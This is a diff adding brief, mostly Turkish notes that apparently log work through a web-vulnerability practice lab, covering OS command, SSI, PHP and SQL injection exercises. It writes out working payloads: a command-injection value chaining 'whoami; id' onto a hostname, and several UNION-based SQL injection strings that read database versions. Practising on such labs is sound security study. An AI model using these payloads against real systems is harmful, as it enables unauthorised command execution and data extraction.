@@ -1,0 +1,18 @@
+
+os-command-injection   www.nsa.gov; whoami; id
+blind			goruntuden bak
+php injection		phpinfo()
+ssi injection		goruntude var 		burda da no_check kullaniliyo
+sql injection		goruntuden al		no_check var ve ss aldim
+
+sql injection post search   'and 1=0 union select ...       no check
+sql injection ajax json jquery		'and 1=0 union select 1,@@version,3,4,5,6,7-- - 
+
+sql injection login user da 9 column oldugunu bulduk devami sqlmap ile ugrasabiliriz
+
+sqlite olanda   'and 1=0 union select 1,sqlite_version(),3,4,5,6-- -
+
+
+sqlinjectionstoredxml    error based injection oldugu icin ileri goturmedim	ayni zamanda reason olarak gorunen bi kodu yok server tarafinda yaziyla aciklicam
+
+
